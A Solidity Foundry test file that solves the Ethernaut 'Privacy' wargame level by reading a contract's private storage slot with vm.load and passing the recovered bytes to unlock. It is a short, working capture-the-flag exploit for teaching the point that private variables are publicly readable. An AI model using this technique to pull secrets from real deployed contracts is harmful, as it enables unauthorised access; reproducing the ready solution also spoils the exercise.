// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/core/Ethernaut.sol";
import "../src/levels/12-PrivacyFactory.sol";

contract PrivacyHackTest is Test {
    Ethernaut ethernaut;
    address attacker = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 wei);
    }

    function testPrivacyHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        PrivacyFactory factory = new PrivacyFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Privacy privacyContract = Privacy(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // All properties (including `private` ones) are readable in a smart contract
        bytes32 data = vm.load(levelAddress, bytes32(uint256(5)));
        privacyContract.unlock(bytes16(data));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
